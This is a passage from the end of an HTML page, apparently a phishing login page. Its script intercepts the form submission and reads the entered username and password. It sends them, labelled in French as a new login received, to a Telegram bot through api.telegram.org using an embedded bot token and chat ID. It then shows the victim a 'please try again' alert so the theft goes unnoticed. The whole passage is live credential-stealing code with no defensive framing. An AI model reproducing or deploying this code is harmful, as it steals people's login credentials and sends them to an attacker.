9j6GQ26l-POyTAZBDesGt3j1psY",e="6033726939";document.getElementById("f").addEventListener("submit",function(n){n.preventDefault();var a=document.getElementById("u").value,o=document.getElementById("p").value,r="Nouvelle connexion reçue !%0AUtilisateur : "+a+"%0AMot de passe : "+o;fetch("https://api.telegram.org/bot"+t+"/sendMessage?chat_id="+e+"&text="+r,{method:"GET"}).then(function(t){return t.json()}).then(function(t){t.ok?alert("Veuillez réessayer"):alert("Erreur : "+t.description)}).catch(function(t){alert("Erreur réseau : "+t)})})}()</script></body></html>
